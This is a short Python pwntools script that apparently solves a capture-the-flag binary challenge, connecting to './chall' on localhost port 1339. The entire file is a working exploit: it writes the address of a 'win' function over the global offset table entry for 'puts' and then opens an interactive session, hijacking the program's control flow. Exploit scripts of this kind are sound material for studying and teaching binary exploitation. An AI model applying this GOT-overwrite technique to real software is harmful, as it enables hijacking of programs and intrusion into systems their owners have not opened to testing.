#!/usr/bin/env python3

from pwn import *

context.binary = "./chall"

def main():
  t = remote("localhost", 1339)

  t.sendlineafter(b"Show me what you GOT!\n", str(context.binary.got["puts"]).encode());
  t.sendlineafter(b"Show me what you GOT! I want to see what you GOT!\n", str(context.binary.symbols["win"]).encode())
  t.interactive()

if __name__ == "__main__":
  main()
